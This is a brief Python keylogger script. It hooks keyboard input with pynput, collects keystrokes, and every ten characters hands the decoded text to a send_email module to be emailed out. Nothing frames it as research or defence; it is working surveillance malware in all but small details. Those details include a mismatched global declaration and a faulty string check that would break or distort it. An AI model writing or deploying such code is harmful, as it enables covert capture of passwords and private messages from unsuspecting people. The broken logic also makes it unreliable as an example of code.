# Libraries needed for recording keyboard input and sending emails
import pynput
from pynput.keyboard import Key, Listener
import send_email

# Number of characters user has typed
character_count = 0

# List to store keystrokes
keys = []

# Function for key pressing 
def on_press(key):
    global keys, count

    # Append key to the list
    keys.append(str(key))

    # Character count is increment
    character_count += 1

    # Send email after 10 characters are recorded
    if character_count >= 10: 
        email(keys)
        keys = []    # Clears list after email is sent
        character_count = 0

# Function for sending the keystroke information through email 
def email(keys):
    keystrokes = ""

    for key in keys:
        
        # Remove quotes that surround the characters
        k = key.replace("'","")

        # Replacing "Key.space" with actual space
        if key == "Key.space":
            k = " " 

        # Getting rid of 'Key'
        elif key.find("Key") > 0:
            k = ""

        # Adding keystrokes to the message string
        keystrokes += k

    print(keystrokes)
    send_email.sendEmail(keystrokes)

# Function to end program when ESC is entered 
def on_release(key):
    if key == Key.esc:
        return False

# Listening to keyboarding 
with Listener(on_press = on_press, on_release = on_release) as listener:
    listener.join()